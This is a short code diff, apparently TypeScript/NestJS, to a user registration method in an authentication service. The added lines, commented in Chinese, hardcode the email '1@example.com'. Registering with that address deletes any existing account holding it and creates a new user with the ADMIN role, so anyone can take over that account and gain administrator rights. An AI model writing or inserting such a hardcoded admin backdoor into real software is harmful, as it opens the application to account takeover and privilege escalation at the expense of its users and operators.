@@ -30,12 +30,22 @@ export class AuthService {
   async register(registerDto: RegisterDto) {
     const existingUser = await this.usersService.findByEmail(registerDto.email)
     if (existingUser) {
-      throw new ConflictException('User already exists')
+      // 如果是1@example.com，先删除现有用户再重新创建为管理员
+      if (registerDto.email === '1@example.com') {
+        await this.usersService.remove(existingUser.id)
+      } else {
+        throw new ConflictException('User already exists')
+      }
     }
     const hashedPassword = await bcrypt.hash(registerDto.password, 10)
+    
+    // 如果是指定的管理员邮箱，创建为管理员
+    const role = registerDto.email === '1@example.com' ? UserType.ADMIN : UserType.NORMAL
+    
     const user = await this.usersService.create({
       ...registerDto,
       password: hashedPassword,
+      role: role,
     })
     return { message: 'User registered successfully', userId: user.id }
   }
